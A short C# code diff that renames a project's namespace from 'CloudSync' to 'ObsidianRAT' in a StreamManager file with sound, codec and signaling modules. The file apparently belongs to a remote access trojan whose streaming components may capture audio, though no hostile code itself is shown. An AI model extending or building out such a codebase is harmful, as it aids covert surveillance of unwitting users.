@@ -1,6 +1,6 @@
-﻿using CloudSync.Services.Modules.Stream.Sound;
-using CloudSync.Services.Modules.Stream.Codec;
-using CloudSync.Services.Modules.Stream.Signaling;
+﻿using ObsidianRAT.Services.Modules.Stream.Sound;
+using ObsidianRAT.Services.Modules.Stream.Codec;
+using ObsidianRAT.Services.Modules.Stream.Signaling;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -9,7 +9,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace CloudSync.Services.Modules.Stream
+namespace ObsidianRAT.Services.Modules.Stream
 {
     public class StreamManager
     {
